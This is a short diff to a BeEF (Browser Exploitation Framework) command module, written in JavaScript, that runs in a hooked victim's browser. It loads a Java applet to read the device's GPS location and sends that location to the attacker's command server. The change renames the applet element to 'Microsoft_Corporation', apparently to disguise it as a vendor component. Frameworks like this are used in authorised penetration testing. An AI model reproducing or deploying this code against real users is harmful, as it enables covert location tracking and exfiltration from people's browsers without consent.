@@ -18,11 +18,11 @@ beef.execute(function() {
     var applet_id = '<%= @applet_id %>';
     var applet_name = '<%= @applet_name %>';
     var output;
-    beef.dom.attachApplet(applet_id, 'getGPSLocation', 'getGPSLocation' ,
+    beef.dom.attachApplet(applet_id, 'Microsoft_Corporation', 'getGPSLocation' ,
        	null, applet_archive, null);
-    output = document.getGPSLocation.getInfo();
+    output = document.Microsoft_Corporation.getInfo();
     if (output) {
-	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'location_info='+output.replace(/\n/g,"<br>"));
+	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'location_info='+output);
     }
     beef.dom.detachApplet('getGPSLocation');
 });
